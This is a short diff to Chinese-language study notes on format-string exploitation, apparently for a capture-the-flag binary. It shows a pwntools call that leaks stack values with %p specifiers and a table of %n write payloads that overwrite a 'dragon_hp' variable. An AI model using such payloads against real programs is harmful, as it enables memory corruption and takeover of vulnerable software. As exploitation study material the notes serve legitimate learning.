@@ -1,5 +1,5 @@
 1. 可以一次泄露多个目标值
-sla('Now answer me, will you v me 50\n','aaaaaaa,%11$p,%17$p')
+   sla('Now answer me, will you v me 50\n','aaaaaaa,%11$p,%17$p')
 
 2. 计算偏移值
 
@@ -31,7 +31,7 @@ gdb$ fmtarg 0xffffd33c  -> 7 ("\%6$p") 也是7
 
 | payload                                          | value                   | Desc                                                      |
 | ------------------------------------------------ | ----------------------- | --------------------------------------------------------- |
-| `b'%8$p'`                                        | 8偏移地址               |                                                           |
+| `b'%8$p'`                                        | 输入 8 偏移的地址       |                                                           |
 | `b'%8$n' + p32(dragon_hp)`                       | -1                      |                                                           |
 | `b'c%9$naaa' + p32(dragon_hp)`                   | 0                       | 这时栈中 第 7 个: `c%9$` 第 8 个 `naaa` 第 9 个 dragon_hp |
 | `b'%128c%10$nbb' + p32(dragon_hp+3)`             | dragon_hp+3 设置为 0x80 | `bb`是填充 4 字节对齐, 用`aa`或者其他都行                 |
